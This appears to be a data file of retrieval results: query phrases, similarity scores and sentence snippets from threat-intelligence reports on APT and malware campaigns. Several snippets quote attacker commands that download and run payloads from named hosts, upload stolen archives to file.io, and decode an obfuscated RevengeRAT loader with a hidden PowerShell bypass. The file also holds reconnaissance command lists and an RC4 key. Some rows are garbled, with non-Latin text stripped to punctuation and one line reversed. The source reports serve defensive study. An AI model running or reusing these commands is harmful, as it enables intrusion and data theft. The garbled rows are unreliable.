as well, but likely from a different process tree.', ""process.cmd LIKE '%restore%' OR data.process.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.process.cmd LIKE '%import%') order by tuned out accordingly."", 'hostcount DESC16 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
"cmd.exe"" /c"|0.8886415531257763|"['These files provide sequential execution of commands using algorithmic structures such as conditional operators and loops.', 'Seeing as how cmd.exe is employed by attackers in a large number of cases and overlaps with other techniques of the MITRE ATT&CK matrix, here we will examine only a few examples of cmd.exe use at different stages of an attack without delving too deep into the details of each example.', 'We give a detailed breakdown of the mentioned procedures in their corresponding techniques.', 'Examples of procedures Example 1 Lateral Tool Transfer via SMB.', 'Attackers use the copy command to copy the contents of the current folder to a remote host (the copied files contain the tools and malware that the attacker needs): $system32\\\\cmd.exe /C copy * \\\\\\\\<remote_ip>\\\\C$\\\\windows\\\\help\\\\help Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Execution TA0002 | Command and Scripting Interpreter: Windows Command Shell T1059.003 Contents 90 Example 2 After gaining access to the system, the attackers conduct reconnaissance.', 'Similar to the procedures in the described incidents, the operator executes reconnaissance commands from cmd.exe: cmd.exe /C netstat -ano cmd.exe /C systeminfo cmd.exe /C whoami cmd.exe /C net view \\\\\\\\<hostname> cmd.exe /C tasklist /v cmd.exe /C arp -a cmd.exe /C net use cmd.exe /C ping <host> -n <count> cmd.exe /C net user <username> /dom cmd.exe /C net group domain admins /dom cmd.exe /C echo list volume | diskpart Example 3 Attackers use cmd.exe to run their malware: cmd /c $system32\\\\conhost64.exe Example 4 Attackers use cmd.exe to download the tools that they will use in subsequent stages of an attack to the compromised system: cmd.exe /c bitsadmin /transfer n hxxp://8.210.141[.', ']104:8099/1.txt $public\\\\Downloads\\\\1.txt cmd.exe /c certutil -urlcache -split -f hxxp://8.210.141[.', ']104:8099/MEUpdate.exe $windir\\\\Help\\\\Help\\\\MEUpdate.exe Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Execution TA0002 | Command and Scripting Interpreter: Windows Command Shell T1059.003 Contents 91 Example 5 Operators exfiltrate the collected data to an external service: cmd.exe /C curl -F ""file=@$selfpath\\\\1.rar"" --ssl-no-revoke https://file.io Example 6 Attackers employ their own batch scripts to perform repetitive actions on a local host and remote ones.', 'Here is a fragment of one script (MD5: 78E8B01C74DA6E0B8A10281C3B13D5B6): Figure 40 Script fragment Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Execution TA0002 | Command and Scripting Interpreter: Windows Command Shell T1059.003 Contents 92 The script gathers data on the system and saves this data to files, then adds them to an archive.', 'Here are all the reconnaissance commands employed in the script: ver >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb time /t >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb date /t >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb hostname >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb systeminfo >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net localgroup Administrators >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb ipconfig /all >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb tasklist /v >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb tasklist -svc >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net start >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb ping www.yandex.ru >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb tracert -h 5 www.yandex.ru >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb netstat -aon >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb netstat -bv >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net use >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net share >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net view >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net view /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net user >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net user /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group ""domain controllers"" /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group ""domain admins"" /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb net group ""domain computers"" /domain >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb nltest /domain_trusts >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb route print >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb arp -a >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb dir /a ""c:\\\\program files\\\\*.', '*"" >> :\\\\Windows\\\\Web\\\\systeminfo.txtbb dir /a ""c:\\\\Program Files (x86)\\\\*.']"
"cmd.exe"" /c"|0.7970209500418814|"['It is worth noting that these samples were all compiled after the domain began being used alongside the knf.gov[.', ']pl watering-hole.', 'Additionally, the samples uploaded from Poland and Uruguay match with the watering-hole activity observed suggesting this is all part of the same campaign.', 'Despite this potential connection to the Poland bank compromises, the malware is not particularly advanced for example using basic operations to gather system information.', 'The malware attempts to run a series of commands with cmd.exe and then returns the result via the C&C, eye-watch[.]in.', 'These commands are as follows: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -all cmd.exe /c ping www.google.com cmd.exe /c query usercmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query ""HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings"" cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find ""TCP"" An example C&C beacon is seen below: GET /design/dfbox/list.jsp?action=What&u=10729854751740 HTTP/1.1 Connection: Keep-Alive User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 Host: www.eye-watch[.', ']in SILVERLIGHT XAP FILE The cambio.xap archive sample (4cc10ab3f4ee6769e520694a10f611d5) does not use eye-watch[.', ']in as a C&C channel but instead was downloaded from the URL: hxxps://www.eye-watch[.', ""]in/design/fancybox/include/cambio.xap 'cambio' is Spanish for 'change'."", 'The URL is similar to that noted in the BadCyber blog, and the use of an XAP file matches what can be found in the Archive.org cache for the sap.misapor[.', ']ch site.']"
"cmd.exe"" /c"|0.8352002528474389|"['Modular architecture of the victims infection process provides both additional flexibility and anonymity throughout the cyber-attack.', 'This scheme allows hackers to divide software development activity between teams, as well as to ensure the reuse of program code.', 'Recon Performs initial reconnaissance to determine if a systems is of interest to the threat actors Dropper Extracts and decrypts Loader Loader Decrypts the payload Client_RAT or Client_TrafficForwarder and injects into the legitimate process Client_TrafficForwarder Forwards operators commands from external network into corporate network Client_RAT Provides full control over the target system Recon is a backdoor that is initially installed on the target machine through successful execution of exploits.', 'This module is used by hackers to perform initial reconnaissance to search for systems of interest.', 'Once launched, the program adds itself to the auto-start by copying its file to the directory ""%USERPROFILE%\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\ Start Menu\\\\Programs\\\\Startup"", collects data about the system and network environment and sends them to the C&C server.', 'Below is a list of data collected: cmd.exe /c hostname cmd.exe /c whoami cmd.exe /c ver cmd.exe /c ipconfig -all cmd.exe /c ping www.google.com cmd.exe /c query user cmd.exe /c net user cmd.exe /c net view cmd.exe /c net view /domain cmd.exe /c reg query HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\ CurrentVersion\\\\Internet Settings cmd.exe /c tasklist /svc cmd.exe /c netstat -ano | find TCP 12 Lazarus arisen: architecture, tools, attribution1 Key 2 Attack 3 Attack 4 Recommendations 5 Indicators of 6 Appendix Findings preparation and organizers compromise implementation In the event the system is not of interest, the module will use the ""killkill"" command to remove itself from the infected system.', 'If the system is of interest, then Recon downloads Dropper using the http command.', 'Dropper will then install Client_RAT to the infected system as follows: RECON DROPPER LOADER CLIENT_RAT 1 2 3 DROPPER Recon decrypts LOADER Dropper decrypts CLIENT_RAT Loader decrypts LOADER and embeds CLIENT_RAT and embeds Loader and embeds CLIENT_RAT Dropper extracts decrypted Client_RAT Client_RAT Dropper extracts and decrypts Loader, embeds it into the system and extracts Client_RAT.', 'To decrypt the configuration file, Dropper needs MD5 encryption key, which only the attacker knows.', 'Group-IB specialists have analyzed two versions of Dropper.', 'There are no fundamental differences between them: both versions were used to decrypt the loader and encrypted payload, as well as to ensure loader persistence in the system.']"
"cmd.exe"" /c"|0.8005088309270048|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
"cmd.exe"" /c"|0.7784302417153919|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
"cmd.exe"" /c"|0.7610348906349725|"['Figure 5: A highly obfuscated XL4 macro.NEW EMOTET WAVES Fortunately, the VMware Threat Analysis Unit has a tool at its disposal, called Symbexcel, that applies symbolic execution techniques to the analysis of Excel macros.16 Using this tool, we can automatically de-obfuscate the XL4 macros and identify the additional components being downloaded (see Figure 6).', 'Figure 6: A de-obfuscated XL4 macro.', 'The functionality of the macro is threefold: 1.', 'Download the next stage payload from one of the payload hosts.', 'The attackers may choose to use multiple hosts to increase the chances to download the payload and improve success rates in the event that one or more hosts are taken down.', '2.', 'Execute the downloaded payload by running rundll32.exe.', '3.', 'Gain registry persistence by running DllRegisterServer (the de-obfuscated version of D""&""l ""&""lR""&""egister""&""Serve""&""r from the EXEC command line is shown Figure 6).', 'The payload is a DLL file, which (unsurprisingly) is the main Emotet DLL.', 'In the case of the Excel document with hash 7c0d0a80e7ebb3af7ce549df78a5a68cbd5debb5, the DLL is 88cf39a587aeb8f075aa0ae23a42e16ce3656e71.']"
"cmd.exe"" /c"|1.0|"[', ,     APT28.', ', ,       - .', ', -    .', ',      .', ': OCEANMAP - ,   C#.', 'cmd.exe.', 'IMAP.', ', base64- ,   (""Drafts"")   ;   , \'  .', '(""INBOX"").', '( ,    ),     .', "".URL- 'VMSearch.url'  .""]"
"cmd.exe"" /c"|0.8089725984772371|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
"cmd.exe"" /c"|1.0|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
This script is for executing the PowerShell script via a Windows scheduled task|1.0|"['From our telemetry, however, we can confirm the victim was eventually compromised by backdoor-type malware.', 'Based on the malwares static information, and parts of the internal code, we assess that the final payload is still very similar to the Persistence Backdoor #2[1] we described in our previous blog.', 'Updated method #2: Scripts and novel downloader Additionally, we observed the download and launch of a suspicious batch file.', 'The actor exploited different LOLBins.', 'The malware execution is done using a legitimate script, SyncAppvPublishingServer.vbs, in the system folder.', 'This script is for executing the PowerShell script via a Windows scheduled task.', 'WScript.exe ""%system32%\\\\SyncAppvPublishingServer.vbs"" ""n;cmd.exe \'/c curl 1perseus.bond/Dgy_0dU08lC/hCHEdlDFGV/P89bXhClww/uiOHK5H35B/bM%3D -A cur1-agent -o %public%\\\\regsile.bat & start /b %public%\\\\regsile.bat\' We also observed the context around that batch file in our telemetry.', 'The batch file name is What is Blockchain.bat.', 'As the file name suggests, this group still targets the blockchain industry.', 'We acquired the scriptlet of the batch file.', '1xcopy /h /y /q How-To-Extension.pdf c:\\\\users\\\\public\\\\Inproc.exe* 2start xcopy /h /y /q Blockchain-old.pdf c:\\\\users\\\\public\\\\rwinsta.exe* 3start c:\\\\users\\\\public\\\\Inproc.exe ""%cd%\\\\Blockchain.pdf"" The Inproc.exe is a legitimate mshta.exe file (MD5 0b4340ed812dc82ce636c00fa5c9bef2), and the rwinsta.exe is a legitimate rundll32.exe file (MD5 ef3179d498793bf4234f708d3be28633).']"
the executable ieinstal.exe was used to bypass UAC.|0.9008119138891123|['Although the initial intrusion methods were very different in this campaign, the final payload that we had analyzed previously was used without significant changes.', 'Novel infection chain Long-lasting initial infection Based on our telemetry, we observed that one victim in the UAE was attacked using a malicious Word document.', 'The victim received a document file named Shamjit Client Details Form.doc on September 2, 2022.', 'Unfortunately, we couldnt acquire the document, but it was executed from the following path: C:\\\\Users\\\\[username]\\\\Desktop\\\\SALES OPS [redacted]\\\\[redacted]\\\\Signed Forms & Income Docs\\\\Shamjit Client Details Form.doc Judging from the file path, we can assume that the victim was an employee in the sales department responsible for signing contracts.', '2/12Upon launch, the malicious document connects to the remote server and downloads the payload.', 'In this particular case, the executable ieinstal.exe was used to bypass UAC.', 'Remote URL: https://bankofamerica.us[.', ']org/lsizTZCslJm/W+Ltv_Pa/qUi+KSaD/_rzNkkGuW6/cQHgsE= Created payload path: %Profile%\\\\cr.dat Spawned command: cmd.exe %Profile%\\\\cr.dat 5pKwgIV5otiKb6JrNddaVJOaLjMkj4zED238vIU= After initial infection, we observed several keyboard hands-on activities by the operator.', 'Through the implanted backdoor, they attempted to fingerprint the victim and install additional malware with high privileges.', 'Upon infection, the operator executed several Windows commands to gather basic system information.', 'They then returned 18 hours later to install further malware with high privileges.']
rundll32.exe|1.0|"['Visual Basic Script hidden behind the web page Its funny to see the malware author tried to attribute the paternity of the script to Microsoft Corp., adding pieces of comments belonging to legit Microsoft utilities: 3/11Update Copyright: Microsoft Corp.', 'This script is designed to be used only for scheduled tasks(s).', 'There is no extensive error check, and will not dump the output from the Powershell CmdLet.', 'Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)} These comments are in fact part of the SyncAppvPublishingServer utility, commonly deployed into Windows 10 machines at C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs.', 'Anyway, the remaining part of the script is responsible to execute a series of malicious actions: Store a base64 encoded version of the RevengeRAT payload into registry key located at HKCU\\\\AppEvents\\\\Values CreateObject(""Wscript.Shell"").regwrite ""HKCU\\\\AppEvents\\\\Values"", ""TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]"" , ""REG_SZ"" Decode and execute of the stored payload Set A0102030405 = CreateObject(""WScript.Shell"") Dim CDT0908087CDT CDT0908087CDT = ""cmd.""', '+ ""exe /C rundll32.""', '+ ""exe javascript:""""\\\\..\\\\mshtml,RunHTMLApplication """";document.write();h=new%20ActiveXObject(""""WScript.Shell"""").run(""""cmd.""', '+ ""exe /c power"" + ""shell -"" + ""Execution"" + ""Policy Bypass -windows"" + ""tyle hidden -noexit -Command [Reflection.""', '+ ""Assembly]::Load([Convert]::FromBase64String((Get- ItemProperty HKCU:\\\\AppEvents).Values)).EntryPoint"" + "".Invoke($N"" + ""ull,$"" + ""Null)"""",0,true);"" A0102030405.run CDT0908087CDT, vbHide Create and execute another VBScript into %AppData%\\\\Local\\\\Temp\\\\Z3j.vbs, capable to download a new payload from the remote destination hxxp://cdtmaster.com[.', ']br Set XbonXo = CreateObject(""WScript.Shell"") Dim XoowA83AC XoowA83AC = ""c"" + ""M"" + ""d /c cd %TEMP% &@echo Z6h = """"h"" + ""t"" + ""tp://cdtmaster.com.br/Document.""', '+ ""mp3"""">>Z3j.vbs &@echo M2l = M5t(""""R]Qc[S\\\\b<SfS"""")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t("""" [af[Z@<f[ZVbb^""""))>>Z3j.vbs &@echo M1s.Open M5t(""""USb""""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""""""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""""OR]RP<ab`SO[""""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"" XbonXo.Run XoowA83AC, vbHide 4/11Finally, the creation of a new task running again the mshta.exe utiliy with the hxxps://pocasideiascdt.blogspot[.']"
rundll32.exe|1.0|"[']com shormanz[.', ']com verofes[.', ']com : 2/3rundll32 C:\\\\Windows\\\\Tasks\\\\pe.dll,DllRegisterServer C:\\\\Windows\\\\Tasks\\\\pe.dll : 1.', '(EXCEL.EXE, WINWORD.EXE )  (, rundll32.exe, wscript.exe ).', ""2.    '"", 'rundll32.exe.', ': 3/3']"
rundll32.exe|1.0|"['Home page of the Blogger drop urlBut a deeper inspection of its source code reveals an interesting snippet inserted into an invisible blog post: this ghost article contains VBScript code.Figure 4.', ""Visual Basic Script hidden behind the web pageIts funny to see the malware author tried to attribute the paternity of the script to Microsoft Corp., adding pieces of comments belonging to legit Microsoft utilities:'Update---------------------------------------------------------------------------------------------' Copyright: Microsoft Corp.'' This script is designed to be used only for scheduled tasks(s).'"", ""There is no extensive error check, and will not dump the output from the Powershell CmdLet.''"", 'Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)}These comments are in fact part of the SyncAppvPublishingServerutility, commonly deployed into Windows 10 machines at C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs.', 'Anyway, the remaining part of the script is responsible to execute a series of malicious actions:Store a base64 encoded version of the RevengeRAT payload into registry key located at""HKCU\\\\AppEvents\\\\Values""CreateObject(""Wscript.Shell"").regwrite ""HKCU\\\\AppEvents\\\\Values"", ""TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]"" , ""REG_SZ""Decode and execute of the stored payloadSet A0102030405 = CreateObject(""WScript.Shell"") Dim CDT0908087CDT CDT0908087CDT = ""cmd.""', '+ ""exe /C rundll32.""', '+ ""exe javascript:""""\\\\..\\\\mshtml,RunHTMLApplication """";document.write();h=new%20ActiveXObject(""""WScript.Shell"""").run(""""cmd.""', '+ ""exe /c power"" + ""shell -"" + ""Execution"" + ""Policy Bypass -windows"" + ""tyle hidden -noexit -Command [Reflection.""', '+ ""Assembly]::Load([Convert]::FromBase64String((Get-ItemProperty HKCU:\\\\AppEvents).Values)).EntryPoint"" + "".Invoke($N"" + ""ull,$"" + ""Null)"""",0,true);"" A0102030405.run CDT0908087CDT, vbHideCreate and execute another VBScript into %AppData%\\\\Local\\\\Temp\\\\Z3j.vbs,capable to download a new payload from the remote destination hxxp://cdtmaster.com[.', ']brSet XbonXo = CreateObject(""WScript.Shell"") Dim XoowA83AC XoowA83AC = ""c"" + ""M"" + ""d /c cd %TEMP% &@echo Z6h = """"h"" + ""t"" + ""tp://cdtmaster.com.br/Document.""', '+ ""mp3"""">>Z3j.vbs &@echo M2l = M5t(""""R]Qc[S\\\\b<SfS"""")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t(""""[af[Z@<f[ZVbb^""""))>>Z3j.vbs &@echo M1s.Open M5t(""""USb""""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""""""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""""OR]RP<ab`SO[""""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"" XbonXo.Run XoowA83AC, vbHideFinally, the creation of a new task running again the mshta.exe utiliy with the hxxps://pocasideiascdt.blogspot[.']"
rundll32.exe|1.0|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
downloader contains an encrypted configuration at the end of the file.|0.8533154577798582|['Upon launch, it copies the D ump.bin file to the % Templates%\\\\war[current time][random value].bin (i.e., war166812964324445.bin).', 'The Dump.bin has a modified PE header.', 'The malware reads the first byte of Dump.bin, 0xAF in this file, and decodes 0x3E8 bytes with that key.', 'The decrypted data is the header of a PE file, overwriting the recovered header to the original file.', 'Eventually, it loads the decrypted DLL file by spawning the ordinary first export function.', 'The spawned downloader contains an encrypted configuration at the end of the file.', 'The malware first acquires the total size of the configuration data and the length of the payload URL from the end of the file.', 'They are located four bytes and eight bytes from the end of the file, respectively.', 'The malware decrypts the configuration data with the RC4 algorithm using an embedded 64-byte key.', 'RC4 key: 46 61 44 6D 38 43 74 42 48 37 57 36 36 30 77 6C 62 74 70 79 57 67 34 6A 79 4C 46 62 67 52 33 49 76 52 77 36 45 64 46 38 49 47 36 36 37 64 30 54 45 69 6D 7A 54 69 5A 36 61 42 74 65 69 67 50 33 Restored URL: hxxps://docs.azure- protection[.', ']cloud/EMPxSKTgrr3/2CKnoSNLFF/0d6rQrBEMv/gGFroIw5_m/n9hLXkEOy3/wyQ%3D%3D Structure of configuration In the case of another downloader, however, the payload URL was delivered using a command line parameter.']
an encrypted decoy document|0.7919037621839915|['Figure 1: BlackEnergy Builder from 2007The convergence of crimeware and APT attacks BLACKENERGY & QUEDAGH 3 The original BlackEnergy toolkit first emerged in 2007 and Some earlier installer variants, then named regedt32.', 'is referred to in this paper as BlackEnergy 1.', 'A later variant exe, were distributed by documents exploiting software of the toolkit (BlackEnergy 2) was released in 2010.', 'We also vulnerabilities, one of which was CVE-2010-3333.', 'These encountered a previously unseen variant, which had been documents drop and execute the installer, then open a rewritten and uses a different format for its configuration.', 'decoy document.', 'It is reasonable to assume that a similar It also no longer uses a driver component.', 'We dubbed this approach has been used to deliver the more recent new variant BlackEnergy 3. installer variants.', 'The installer filename of BlackEnergy 3 is still msiexec.exe.', 'INFECTION VECTORS However, it is delivered and executed by a dropper which Most of the recent BlackEnergy installers collected are opens a decoy document in the foreground.', 'We also named msiexec.exe.']
an encrypted decoy document|0.9483522105030202|['To successfully exploit a vulnerability, the shellcode is first decrypted.', 'It then searches for the The majority of the Taidoor malware samples we have filehandle of the exploit document by comparing the file seen in the wild were delivered via email.', 'We also saw sizes of enumerated handles to a hardcoded file size considerable variations among the email and IP that is supposed to be that of the exploit document.', 'addresses the senders used.', 'Once the handle is found, two buffers are read from the We listed down some of the emails that were sent via an exploit document, which contains the encrypted payload IP address that also served as a C&C server below.', 'This and an encrypted decoy document.', 'was one of the IP addresses that some compromised systems accessed.', 'While we do not exactly know how The payload is then decrypted and saved as a file in the the compromises occurred, we can, based on the Windows temporary directory.', 'The payload is then attackers method of operation, determine which email commonly executed using the WinExec application was the most likely attack vector.', 'programming interface (API).', 'Sample email 18 After the payload is executed, the decoy document is From: minaki.yang@yahoo.com decrypted and also saved in the Windows temporary Subject: US-TAIWAN directory.']
The PDF and executable files have numerous spaces before the file extension to hide it and allay suspicions.|1.0|"['When the user clicks the link, it executes the 1.vbs file through the WScript process.', 'When we checked the VBS file, it only generated an ok message, which suggests BlueNoroff is still experimenting with this method.', '<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?> <Relationships xmlns=""http://schemas.openxmlformats.org/package/2006/relationships""> 1 <Relationship Id=""rId2"" Type=""http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"" 2 Target=""wscript%201.vbs"" TargetMode=""External""/><Relationship Id=""rId1"" Type=""http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout"" Target=""../slideLayouts/slideLayout1.xml""/></Relationships> Based on our other findings, we discovered an in-the-wild sample (MD5 a17e9fc78706431ffc8b3085380fe29f) from VirusTotal.', 'At the time of analysis, this .vhd sample wasnt detected by any antivirus.', 'The virtual disk file contains a decoy PDF file, Windows executable file, and an encrypted Dump.bin file.', 'The PDF and executable files have numerous spaces before the file extension to hide it and allay suspicions.', '4/12Files inside VHD a file The Job_Description[spaces].exe file (MD5 931d0969654af3f77fc1dab9e2bd66b1) is a loader that loads the next stage payload.', 'Upon launch, it copies the D ump.bin file to the % Templates%\\\\war[current time][random value].bin (i.e., war166812964324445.bin).', 'The Dump.bin has a modified PE header.', 'The malware reads the first byte of Dump.bin, 0xAF in this file, and decodes 0x3E8 bytes with that key.', 'The decrypted data is the header of a PE file, overwriting the recovered header to the original file.']"
The malware decrypts the configuration data with the RC4 algorithm using an embedded 64-byte key.|1.0000000000000002|['The decrypted data is the header of a PE file, overwriting the recovered header to the original file.', 'Eventually, it loads the decrypted DLL file by spawning the ordinary first export function.', 'The spawned downloader contains an encrypted configuration at the end of the file.', 'The malware first acquires the total size of the configuration data and the length of the payload URL from the end of the file.', 'They are located four bytes and eight bytes from the end of the file, respectively.', 'The malware decrypts the configuration data with the RC4 algorithm using an embedded 64-byte key.', 'RC4 key: 46 61 44 6D 38 43 74 42 48 37 57 36 36 30 77 6C 62 74 70 79 57 67 34 6A 79 4C 46 62 67 52 33 49 76 52 77 36 45 64 46 38 49 47 36 36 37 64 30 54 45 69 6D 7A 54 69 5A 36 61 42 74 65 69 67 50 33 Restored URL: hxxps://docs.azure- protection[.', ']cloud/EMPxSKTgrr3/2CKnoSNLFF/0d6rQrBEMv/gGFroIw5_m/n9hLXkEOy3/wyQ%3D%3D Structure of configuration In the case of another downloader, however, the payload URL was delivered using a command line parameter.', 'Also, some of the other downloaders (MD5 f766f97eb213d81bf15c02d4681c50a4) have functionality that checks the working environment.', 'If the size of physical memory is less than 2,147,483,648 bytes, the malware terminates execution.', '5/12Infection flow of downloader This downloader checks for the names of the following antivirus vendors: Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender.']
checks for the names of the following antivirus vendors: Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender|0.7827483727726834|['The malware decrypts the configuration data with the RC4 algorithm using an embedded 64-byte key.', 'RC4 key: 46 61 44 6D 38 43 74 42 48 37 57 36 36 30 77 6C 62 74 70 79 57 67 34 6A 79 4C 46 62 67 52 33 49 76 52 77 36 45 64 46 38 49 47 36 36 37 64 30 54 45 69 6D 7A 54 69 5A 36 61 42 74 65 69 67 50 33 Restored URL: hxxps://docs.azure- protection[.', ']cloud/EMPxSKTgrr3/2CKnoSNLFF/0d6rQrBEMv/gGFroIw5_m/n9hLXkEOy3/wyQ%3D%3D Structure of configuration In the case of another downloader, however, the payload URL was delivered using a command line parameter.', 'Also, some of the other downloaders (MD5 f766f97eb213d81bf15c02d4681c50a4) have functionality that checks the working environment.', 'If the size of physical memory is less than 2,147,483,648 bytes, the malware terminates execution.', '5/12Infection flow of downloader This downloader checks for the names of the following antivirus vendors: Sophos, Kaspersky, Avast, Avira, Bitdefender, TrendMicro, and Windows Defender.', 'If TrendMicro, BitDefender, or Windows Defender products are installed, the malware conducts a classic unhooking DLL trick intended to remove user-mode hooks from the system library.', 'This evasion technique overwrites the .text section of the pre-loaded ntdll library with the freshly loaded one so that the hooked API addresses are recovered with the original API address.', 'With this trick, the malware can disable the functionalities of EDR/AV products.', 'Next, the malware creates a mutex to avoid duplicate execution.', 'Mutex name: da9f0e7dc6c52044fa29bea5337b4792b8b873373ba99ad816d5c9f5f275f03f Next, the malware opens a PDF decoy document in the same directory.']
